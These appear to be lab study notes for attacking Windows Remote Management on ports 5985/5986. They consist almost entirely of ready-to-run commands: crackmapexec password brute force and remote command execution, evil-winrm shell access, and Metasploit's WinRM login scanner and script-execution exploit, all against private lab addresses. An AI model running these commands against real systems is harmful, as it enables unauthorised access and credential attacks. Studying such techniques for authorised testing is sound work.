
# Overview
Windows Remote Management (WinRM)

## Ports
- 5985/5986 ports


---

# Tools
## crackmapexec
- brute force
- `crackmapexec winrm 10.2.18.45 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
- `crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -x "whoami"`

---

## evil-winrm.rb
- ruby script which gets shell access
- `evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.2.18.5`

---

## msfconsonle
- `search type:auxiliary winrm` : search for scanner
- `use auxiliary/scanner/winrm/winrm_login` : brute force
- `use exploit/windows/winrm/winrm_script_exec`
	- `set rhosts addr`
	- `set force_vbs true`
	- `set username administrator`
	- `set password tinkerbell`
- 